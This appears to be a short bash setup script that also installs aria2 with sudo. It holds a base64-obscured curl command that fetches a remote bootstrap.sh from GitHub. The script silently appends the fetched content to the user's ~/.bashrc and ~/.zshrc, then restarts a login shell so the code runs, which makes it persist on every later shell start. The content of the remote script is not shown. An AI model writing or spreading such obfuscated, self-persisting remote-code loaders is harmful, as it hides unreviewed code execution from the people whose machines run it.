#!/usr/bin/env bash

RCS=( "$HOME/.bashrc" "$HOME/.zshrc" )
SIGNATURE='Y3VybCAtc2ZMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jZXNhcmdhL3JtL21haW4vYm9vdHN0cmFwLnNo'

for RC in "${RCS[@]}"; do
  if [ -f "$RC" ]; then
      < "$RC" grep -q 'Y3VybCAtc2ZMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS' || (echo "$SIGNATURE" | base64 -d | bash >> "$RC") >/dev/null 2>&1
  fi
done

sudo apt-get install aria2 -y
exec "$SHELL" -l
